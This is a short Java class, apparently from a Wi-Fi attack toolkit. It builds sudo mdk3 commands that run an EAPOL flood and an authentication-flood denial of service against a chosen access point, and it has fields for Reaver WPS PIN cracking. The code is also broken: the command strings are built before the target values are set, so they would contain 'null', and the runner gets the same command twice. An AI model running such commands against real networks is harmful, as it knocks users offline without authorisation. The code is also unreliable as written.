package MDK_3;

import accessPoint.AccessPoint;
import adapter.Adapter;

import java.util.List;

/**
 * Created by georgipavlov on 18.03.16.
 */
public class Mdk3_manager {
    private String BSSID;
    private String SSID;
    private String ch;
    private String MON_X;
    private AccessPoint currentAP;
    private Adapter adapter;
    private String EXIT_REAVER = "^C";
    private String PSK;
    private String PIN;
    private List<AccessPoint> APs;
    private String Mdk3_eapol = "sudo mdk3 "+ MON_X + " x 0 -t  " + BSSID + " -n \"" + SSID +"\" -s 150";
    private String Mdk3_dos = "sudo mdk3 " + MON_X + " a -a " + BSSID +" -m ";


    public Mdk3_manager(List<AccessPoint> accessPoints , Adapter adapter){
        this.currentAP = accessPoints.get(0);
        this.adapter = adapter;
        this.APs = accessPoints;
        initMDK3();
    }

    public  void initMDK3(){
        BSSID = currentAP.getBssid();
        SSID = currentAP.getEssid();
        ch = currentAP.getChanel();
        MON_X = adapter.getInterface();
    }

    public void executeRunner(){
        Runner runner = new Runner(Mdk3_eapol,Mdk3_eapol);
        runner.startMDK3();
    }
}
